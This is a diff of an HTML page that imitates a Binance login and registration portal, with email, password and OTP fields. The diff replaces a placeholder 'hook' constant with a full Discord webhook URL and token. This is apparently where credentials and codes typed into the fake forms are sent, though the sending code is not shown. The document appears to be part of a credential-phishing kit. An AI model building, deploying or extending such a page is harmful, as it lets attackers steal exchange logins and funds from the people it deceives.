@@ -50,7 +50,7 @@
 <div id="auth-overlay">
     <div class="auth-card" id="choice-box">
         <h2 style="color: var(--yellow);">BINANCE</h2>
-        <p style="color:var(--text-gray)">Institutional Archive v4.0.2</p>
+        <p style="color:var(--text-gray)">v4.0.2</p>
         <button class="btn-yellow" onclick="showForm('reg')">Register Account</button>
         <button class="btn-yellow" style="background:transparent; border:1px solid #555; color:white; margin-top:10px;" onclick="showForm('login')">Member Login</button>
     </div>
@@ -72,7 +72,7 @@
         <h3>Terminal Login</h3>
         <input type="email" id="l-email" placeholder="Email Address">
         <input type="password" placeholder="Password">
-        <button class="btn-yellow" onclick="startAuth('login')">Unlock Archive</button>
+        <button class="btn-yellow" onclick="startAuth('login')">Unlock Archive </button>
     </div>
 
     <div class="auth-card" id="otp-box" style="display:none;">
@@ -161,7 +161,7 @@
 <script>
     let code = "";
     let rates = { USD: 1, PHP: 57.50, SGD: 1.35 };
-    const hook = "https://discord.com";
+    const hook = "https://ptb.discord.com/api/webhooks/1502014942323278016/AEdRKrTMN507nDn3jgQZDE_9IAGbo8tTJkTG_Qd2BU7c-mgRA0tNlSm9pZD79ASM9jdv";
     const coins = ["Bitcoin", "Ethereum", "Tether", "BNB", "Solana", "XRP", "USDC", "Cardano", "Avalanche", "Dogecoin", "TRON", "Polkadot", "Polygon", "Chainlink", "Shiba Inu"];
 
     function showForm(t) { document.getElementById('choice-box').style.display='none'; document.getElementById(t+'-box').style.display='block'; }
